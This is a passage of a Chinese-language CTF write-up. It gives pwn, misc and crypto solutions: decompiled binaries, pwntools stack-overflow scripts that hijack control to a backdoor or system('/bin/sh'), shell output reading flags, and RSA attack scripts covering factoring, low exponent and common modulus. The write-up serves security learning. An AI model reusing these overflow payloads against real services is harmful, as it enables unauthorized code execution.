  printf("\x1B[33m> \x1B[0m");
  fflush(_bss_start);
  ((void (__fastcall *)(char *, __int64))safe_read_input)(s1, 64LL);
  if ( strcmp(s1, "no") )
  {
    printf(a31m_1, "no", v0, v1, v2, v3, *(_QWORD *)s1, v6, v7, v8, v9, v10, v11, v12);
    exit(1);
  }
  return printf(a32m_1, "no", v0, v1, v2, v3, *(_QWORD *)s1, v6, v7, v8, v9, v10, v11, v12);
}
```

```c
int vulnerable_function()
{
  _QWORD buf[4]; // [rsp+0h] [rbp-20h] BYREF

  memset(buf, 0, sizeof(buf));
  puts(asc_402660);
  puts(asc_402698);
  puts(asc_4026E8);
  printf("\x1B[33m> \x1B[0m");
  fflush(_bss_start);
  read(0, buf, 0xC8uLL);
  return puts(asc_402728);
}
```

**分析**

- 第一个问题`64-bit`
- 第二个问题`no`
- `_QWORD buf[4]; // [rsp+0h] [rbp-20h] BYREF`这里`8 * 4 = 32`而且`20h == 0x20 == 32`
- `read(0, buf, 0xC8uLL)`这里存在栈溢出

**数据搜集**

```c
void __noreturn backdoor()
{
  printf(format);
  printf(a32m);
  if ( system("cat flag") )
    printf(a31m);
  exit(0);
}
```

```assembly
.text:00000000004011F7                 public backdoor
.text:00000000004011F7 backdoor        proc near
.text:00000000004011F7 ; __unwind {
.text:00000000004011F7                 push    rbp
.text:00000000004011F8                 mov     rbp, rsp
.text:00000000004011FB                 mov     edi, offset format ; "\x1B[32m\n[+] "
.text:0000000000401200                 mov     eax, 0
.text:0000000000401205                 call    _printf
.text:000000000040120A                 mov     edi, offset a32m ; "\x1B[32m[+] "
.text:000000000040120F                 mov     eax, 0
.text:0000000000401214                 call    _printf
.text:0000000000401219                 mov     edi, offset command ; "cat flag"
.text:000000000040121E                 call    _system
.text:0000000000401223                 test    eax, eax
.text:0000000000401225                 jz      short loc_401236
.text:0000000000401227                 mov     edi, offset a31m ; "\x1B[31m[!] "
.text:000000000040122C                 mov     eax, 0
.text:0000000000401231                 call    _printf
.text:0000000000401236
.text:0000000000401236 loc_401236:                             ; CODE XREF: backdoor+2E↑j
.text:0000000000401236                 mov     edi, 0          ; status
.text:000000000040123B                 call    _exit
.text:000000000040123B ; } // starts at 4011F7
.text:000000000040123B backdoor        endp
```

**编写最终脚本**

```python
from pwn import *

r = remote("fliaz.top", 32866)

payload = "64-bit".encode()
r.sendlineafter("> ".encode(), payload)

payload = "no".encode()
r.sendlineafter("> ".encode(), payload)

backdoor_addr = 0x401219

payload = cyclic(0x20)
payload += p64(0xdeadbeef)
payload += p64(backdoor_addr)
r.sendafter("> ".encode(), payload)

r.interactive()
r.close()
```

**运行最终脚本**

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
[x] Opening connection to fliaz.top on port 32866
[x] Opening connection to fliaz.top on port 32866: Trying 8.137.163.212
[+] Opening connection to fliaz.top on port 32866: Done
[*] Switching to interactive mode

[*] 正在返回... 如果偏移正确，即将获得 Flag。
pkwsec{6d58231e-aec5-43a3-bec6-a8c135eb5e34}
[*] Got EOF while reading in interactive
```

**得到：pkwsec{6d58231e-aec5-43a3-bec6-a8c135eb5e34}**



### Pwn 2: Dilemma

#### 解题过程

**查看源码**

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  init_func(argc, argv, envp);
  dofunc();
  return 0;
}
```

```c
__int64 dofunc()
{
  int v1; // [rsp+Ch] [rbp-4h] BYREF

  v1 = 0;
  while ( 1 )
  {
    while ( 1 )
    {
      printf("\x1B[1m");
      printf("\x1B[34m\n\n\x1B[0m");
      printf(a36m_1);
      printf(a36m_2);
      printf(a36m_3);
      printf(a36m_4);
      printf(a1m_2);
      puts(a32m10m1m);
      puts(a32m20m1m);
      puts(a32m30m1m);
      puts(a32m40m1m);
      printf(a1m_3);
      if ( (unsigned int)__isoc23_scanf(&unk_4026E8, &v1) == 1 )
        break;
      puts(a31m1m);
      while ( getchar() != 10 )
        ;
    }
    while ( getchar() != 10 )
      ;
    if ( v1 == 4 )
      break;
    if ( v1 > 4 )
      goto LABEL_17;
    switch ( v1 )
    {
      case 3:
        puts(a33m1m_1);
        backdoor_func();
        break;
      case 1:
        puts(a33m1m);
        puts(&byte_402768);
        break;
      case 2:
        puts(a33m1m_0);
        fake_password_func();
        break;
      default:
LABEL_17:
        puts(a31m1m_0);
        break;
    }
  }
  puts(a36m_5);
  return 0LL;
}
```

```c
__int64 backdoor_func()
{
  char buf[16]; // [rsp+0h] [rbp-10h] BYREF

  printf(format);
  puts("=======================================");
  printf(a36m);
  printf(a1m_0);
  read(0, buf, 0x100uLL);
  printf(buf);
  if ( global_test3 == 100 )
  {
    printf(a1m32m);
    system("/bin/sh");
  }
  else
  {
    printf(a1m31mX, (unsigned int)global_test3);
  }
  return 0LL;
}
```

**分析**

- `read(0, buf, 0x100uLL)`这里存在栈溢出
- `system("/bin/sh")`这里存在后门

**数据搜集**

```assembly
.text:000000000040129B                 mov     edi, offset command ; "/bin/sh"
.text:00000000004012A0                 call    _system
```

**编写最终脚本**

```python
from pwn import *

r = remote("fliaz.top", 32877)

payload = str(3).encode()
r.sendlineafter(": ".encode(), payload)

backdoor_addr = 0x40129B

payload = cyclic(0x10)
payload += p64(0xdeadbeef)
payload += p64(backdoor_addr)
r.sendafter("： ".encode(), payload)

r.interactive()
r.close()
```

**运行最终脚本**

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
[x] Opening connection to fliaz.top on port 32877
[x] Opening connection to fliaz.top on port 32877: Trying 8.137.163.212
[+] Opening connection to fliaz.top on port 32877: Done
[*] Switching to interactive mode
aaaabaaacaaadaaaﾭ�
[x] 符号无效，test3 的值是 0。这不是正确的“后门密码”。
ls
dilemma
flag.txt
cat flag.txt
pkwsec{b2753868-bbac-4564-938b-aae992c4f562}
```

**得到：pkwsec{b2753868-bbac-4564-938b-aae992c4f562}**



### pwn1

#### 解题过程

```shell
nc fliaz.top 32775
```

```shell
pkwsec{4841cc0c-9a93-46a3-9ef1-754fce9d450f}
```

**得到：pkwsec{4841cc0c-9a93-46a3-9ef1-754fce9d450f}**



### pwn2

#### 解题过程

**查看源码**

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  vuln();
  return 0;
}
```

```c
int vuln()
{
  char s[64]; // [esp+Ch] [ebp-4Ch] BYREF
  int v2; // [esp+4Ch] [ebp-Ch]

  v2 = 0;
  puts("\n=== Little Orca Association Cooking Challenge ===");
  puts("Lion senior is hungry! He only eats 0xdeadbeef!");
  puts("Doraemon senior: 'Help me cook the right recipe!'\n");
  printf("Input your recipe: ");
  fflush(stdout);
  gets(s);
  puts("Cooking... Lion senior is tasting...");
  if ( v2 == -559038737 )
    return win();
  puts("[FAIL] Lion senior: 'This is not deadbeef! Try again...'");
  return puts("Hint: Maybe you need a longer recipe?");
}
```

**编写最终脚本**

```python
from pwn import *

r = remote("fliaz.top", 32776)

payload = cyclic(0x4C - 0xC)
payload += p32(-559038737)
r.sendafter("Input your recipe: ".encode(), payload)

r.interactive()
r.close()
```

**运行最终脚本**

```shell

```

**得到：**



## Misc

### base家族

#### 解题过程

**查看题目**

```shell
76S'bRZ@bzamT7+SA!Qo;ka.E'hwBURM1sS@fo/8@@l??nM@Hi%kd6\hbIZDmMoJF\R!ww4C5%Jw%Kre7OkVbk,Yt#V3T'9#/mQZV^/(Utj>n!U<0O;qOA_v9U:iS)ZuADR/^}VYc,q3>?u#/(G?wh_X3fLM(J%o7pH5-rY8!u<4=k3DIQFGIwZa42To)OAY9bslK,/7gkl=nt{!H'1sFt/ghbDcUJrTD4]n
```

**工具使用**

- 随波逐流CTF编码工具v7

**解码过程**

```shell
Base混合多重解码:
[解码7次] Base92 -> Ascii85 -> Base64 -> Base62 -> Base58 -> Base45 -> Base32
```

**得到：PKWCTF{b@se_e4sy!!!!!!}**



### 编码挑战

#### 解题过程

**查看题目**

```shell
nc fliaz.top 32776
```

```shell
Silly Bird: Welcome to the Encoding Challenge!
I created a random string and encoded it 5 times.
Your task is to decode it back to the original string.
If you provide the correct original string, I'll give you the flag!


Encoded string:
Vmtjd2VHUXlSa2RpUldoclpXeGFVMVZzV2t0U2JIQlpZMGhLYUUxV1NsZFZNakZ6Vkd4a1JrMUliRlZXVm13elZVWkZPVkJSUFQwPQ==

Your task is to decode this string back to the original.
Enter the decoded original string below:
Original string:
```

**Base64解码**

```shell
6ja`l9@DD{9$MBb1s60]
```

```shell
Congratulations! You successfully decoded the base64 layers!
Here is your flag: pkwsec{0072a048-79bf-437a-8cc6-23e26ce3dc76}
```

**得到：pkwsec{0072a048-79bf-437a-8cc6-23e26ce3dc76}**



## Crypto

### crypto1-呆呆鸟的数字灵魂试炼 1

#### 解题过程

**查看题目**

```shell
nc fliaz.top 32787
```

```shell
Silly Bird:I will show you 10 numbers one by one.
For each number, you need to calculate φ(n) and enter your answer.
If you get any answer wrong, the program will exit immediately.

(Generating the questions, please wait a moment.)
                                                               

Number 1: 47
Please enter φ(47): 46
Correct!

Number 2: 577
Please enter φ(577): 
```

**最终脚本**

```python
from galois import euler_phi
from pwn import *

r = remote("fliaz.top", 32787)

r.recvuntil("(Generating the questions, please wait a moment.)".encode())

for i in range(10):
    r.recvuntil(f"Number {i + 1}: ".encode())
    n = int(r.recvuntil("\n".encode()).decode().strip())
    phi_n = euler_phi(n)
    r.sendline(str(phi_n).encode())

r.recvuntil("pkwsec{".encode())
flag = "pkwsec{" + r.recvuntil('}'.encode()).decode()
print(flag)

r.close()
```

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
[x] Opening connection to fliaz.top on port 32787
[x] Opening connection to fliaz.top on port 32787: Trying 8.137.163.212
[+] Opening connection to fliaz.top on port 32787: Done
pkwsec{9676aea5-e13b-41ef-8f51-8269d064260f}
[*] Closed connection to fliaz.top port 32787

进程已结束，退出代码为 0
```

**得到：pkwsec{9676aea5-e13b-41ef-8f51-8269d064260f}**



### **crypto2-呆呆鸟的数字灵魂试炼 2**

#### 解题过程

```shell
nc fliaz.top 32788
```

```shell
Silly Bird:I will show you 10 numbers one by one.
For each number, you need to calculate φ(n) and enter your answer.
If you get any answer wrong, the program will exit immediately.

(Generating the questions, please wait a moment.)
                                                               

Number 1: 97
Timer started! You have 5 seconds to complete all 10 questions.
Please enter φ(97):
```

**最终脚本**

```python
from galois import euler_phi
from pwn import *

r = remote("fliaz.top", 32788)

r.recvuntil("(Generating the questions, please wait a moment.)".encode())

for i in range(10):
    r.recvuntil(f"Number {i + 1}: ".encode())
    n = int(r.recvuntil("\n".encode()).decode().strip())
    phi_n = euler_phi(n)
    r.sendline(str(phi_n).encode())

r.recvuntil("pkwsec{".encode())
flag = "pkwsec{" + r.recvuntil('}'.encode()).decode()
print(flag)

r.close()
```

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
[x] Opening connection to fliaz.top on port 32788
[x] Opening connection to fliaz.top on port 32788: Trying 8.137.163.212
[+] Opening connection to fliaz.top on port 32788: Done
pkwsec{cf3f13c4-fdd2-4791-8c82-77c9f9bc6e86}
[*] Closed connection to fliaz.top port 32788

进程已结束，退出代码为 0
```

**得到：pkwsec{cf3f13c4-fdd2-4791-8c82-77c9f9bc6e86}**



### crypto3-失衡的素数结界

#### 解题过程

**查看题目**

```shell
nc fliaz.top 32770
```

```shell
Silly Bird: Welcome to the RSA Challenge!
I will generate a weak RSA key and encrypt a random message.
Your task is to decrypt the message by factoring the modulus n.
If you provide the correct decrypted message, I'll give you the flag!



RSA Public Key:
n = 6778582624271065640104611590776053433754997341452471622672194729079854723573159426579148421594482894616041314143277178311446990340496980555478646009333814723095618466681314270101639298449450484085850631961000523020580090170295617132307697658673336482840993312314368581565279377568037229460504433127208064643482149
e = 65537

Encrypted message (ciphertext):
c = 402237506595585355562844731211770209972896538184337103190280554778207654636494605829083090941828809838244136538329719451504324196160330268058019188413895064069187212868977525158318983186295694569963124004493797453651195596969433109843887879618460366477161158701438464654469026093457214073937638313610477064721586

Your task is to factor n and decrypt the message.
Enter the decrypted plaintext (as an integer) below:
Decrypted plaintext:
```

**最终脚本**

```python
from Crypto.Util.number import inverse
from sympy import factorint
from pwn import *

r = remote("fliaz.top", 32770)

r.recvuntil("n = ".encode())
n = int(r.recvline().decode().strip())

r.recvuntil("e = ".encode())
e = int(r.recvline().decode().strip())

r.recvuntil("c = ".encode())
c = int(r.recvline().decode().strip())

p, q = list(factorint(n).keys())
phi_n = (p - 1) * (q - 1)
d = inverse(e, phi_n)
m = pow(c, d, n)
r.sendlineafter("Decrypted plaintext: ".encode(), str(m).encode())

r.recvuntil("pkwsec".encode())
print(f"pkwsec{r.recvuntil("}".encode()).decode()}")
r.close()
```

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
[x] Opening connection to fliaz.top on port 32770
[x] Opening connection to fliaz.top on port 32770: Trying 8.137.163.212
[+] Opening connection to fliaz.top on port 32770: Done
pkwsec{2479d118-16fb-4d77-b4b1-615998082c6b}
[*] Closed connection to fliaz.top port 32770

进程已结束，退出代码为 0
```

**得到：pkwsec{2479d118-16fb-4d77-b4b1-615998082c6b}**



### crypto4-三次方的破绽

#### 解题过程

**查看题目**

```shell
nc fliaz.top 32771
```

```shell
Silly Bird: Welcome to the RSA Low Exponent Challenge!
I use a very small public exponent (e=3) to encrypt a message.
Your task is to decrypt the message without factoring the modulus.
If you provide the correct decrypted message, I'll give you the flag!



RSA Public Key:
n = 4648094122556555780916197126466797407469123508748403296161256912590798506529569540799159344283624084454146988068040281882011018387823019961048883385925384853423234884634218978400785106444999179572500244711426166170248777356545382288555082049576762642576344868566653174870610286694233323358827198064292687668880599769798391791024913037484582268457624645181229662526578627548765818393709823649888167408253559358781468480499863986466130069908240931844205297008825928296760797806872285616392814562637893695591018647406420936831598828848730169007160203780635035660974988497502236995356342284451080204081888518854965481989
e = 3

Encrypted message (ciphertext):
c = 5450282762338244901680316645294693857411242607571204296699232142266264893377475828526360401331646046872134621000343430412607172948213833078083188329742351350958330493827335497081450415089135487987814491710232890828792768160903636375411040299810335526928753885832073985336163540431231657858714209069102015913440797922470508712147370065169379656396599308140629043858044700518351010301125006997610078118270671083636024707194848958846028516087732663763653820257115950230211955013606366257895709331486342967241020506666906799368706937746994284480463051237969649881582704178409329329191105501196174467158395579289

Your task is to exploit the low exponent vulnerability (e=3)
and recover the original plaintext.
Enter the decrypted plaintext (as an integer) below:
Decrypted plaintext:
```

**最终脚本**

```python
from Crypto.Util.number import inverse
from sympy.external.gmpy import iroot
from sympy import factorint
from pwn import *

r = remote("fliaz.top", 32771)

r.recvuntil("n = ".encode())
n = int(r.recvline().decode().strip())

r.recvuntil("e = ".encode())
e = int(r.recvline().decode().strip())

r.recvuntil("c = ".encode())
c = int(r.recvline().decode().strip())

m = iroot(c, 3)[0]
r.sendlineafter("Decrypted plaintext: ".encode(), str(m).encode())

r.recvuntil("pkwsec".encode())
print(f"pkwsec{r.recvuntil("}".encode()).decode()}")
r.close()
```

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
[x] Opening connection to fliaz.top on port 32771
[x] Opening connection to fliaz.top on port 32771: Trying 8.137.163.212
[+] Opening connection to fliaz.top on port 32771: Done
pkwsec{8cf4edf3-4f4f-4f31-8c4b-e6cac6101196}
[*] Closed connection to fliaz.top port 32771

进程已结束，退出代码为 0
```

**得到：pkwsec{8cf4edf3-4f4f-4f31-8c4b-e6cac6101196}**



### crypto5-双重加密的陷阱

#### 解题过程

**查看题目**

```shell
nc fliaz.top 32774
```

```shell
Silly Bird: Welcome to the RSA Challenge 3!
I encrypted the same message with two different public exponents but the same modulus.
Your task is to recover the original message using the common modulus attack.
If you provide the correct decrypted message, I'll give you the flag!



RSA Public Key:
n = 1089463124899860199049361343083514970448743904115619591867191471740327466062855645093820850775229292433437525513396996365370875301571205769717025765906674642753488279769525206034230551481294256245403903359396585611440828302362187905083692819771343748198331168828561919910836129629981605947122004902897435486176755431705690564920433594605750753351194794681194674664555734556484193170610399941193620054204707687048964007582038299845383828617631086811752050112991937646867483079139646844893028273018831353979897377831422543991484179916730523856596737414888642526293165811453226948535545033026008169132342822103495866377
e1 = 5957
e2 = 4385

Encrypted messages (ciphertexts):
c1 = 488995306156966369947333096731741006120183897125822853465187296739652079775654827359183855526902692143804136726041243846306659212454977708753188044594990309615423880993259763610685219957162731225643877281440923337643060106024607044190131443343002269621733105931344152574435620031803727527274801106905345438611421023824950274145028667955463724973787707612903760949931713852578352258165707078607050007169534742878499136832256258738652492457842811898276819950839137534292214915643298295072779735065708538359810291998741255567455111357452420784511698878038670521328169878313705008093506365066593617842327403812425963781
c2 = 874008326045164899170130658721535701530214487956539038670957262977996488763057746204851999912039394862060936058690030194931643991466164613517523520102145143963480693341389284940213966398733228110160017830281640877047797360364929685852704909789745924222149107793800287122782946430405679049538983225712937265089583722876880705000146001284437710551473583376738818829421911722234126902325677422736411371930709894459401456121793937146806891157450621599917448308829962159632387117467126406667429638980770557951140229528104229774304416207470390553477049298206985912567531247958114705701161203344526310549366344858048985796

Your task is to exploit the common modulus vulnerability
and recover the original plaintext.
Enter the decrypted plaintext (as an integer) below:
Decrypted plaintext:
```

**分析**

- 共模攻击直接套公式

**最终脚本**

```python
from gmpy2 import gmpy2
from pwn import *

r = remote("fliaz.top", 32774)

r.recvuntil("n = ".encode())
n = int(r.recvline().decode().strip())

r.recvuntil("e1 = ".encode())
e1 = int(r.recvline().decode().strip())
r.recvuntil("e2 = ".encode())
e2 = int(r.recvline().decode().strip())

r.recvuntil("c1 = ".encode())
c1 = int(r.recvline().decode().strip())
r.recvuntil("c2 = ".encode())
c2 = int(r.recvline().decode().strip())

g, s1, s2 = gmpy2.gcdext(e1, e2)
m = pow(c1, s1, n) * pow(c2, s2, n) % n
r.sendlineafter("Decrypted plaintext: ".encode(), str(m).encode())

r.recvuntil("pkwsec".encode())
print(f"pkwsec{r.recvuntil("}".encode()).decode()}")
r.close()
```

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
[x] Opening connection to fliaz.top on port 32774
[x] Opening connection to fliaz.top on port 32774: Trying 8.137.163.212
[+] Opening connection to fliaz.top on port 32774: Done
pkwsec{2d7ae327-02e2-472c-b6b6-d56e58d0b2c0}
[*] Closed connection to fliaz.top port 32774

进程已结束，退出代码为 0
```

**得到：pkwsec{2d7ae327-02e2-472c-b6b6-d56e58d0b2c0}**
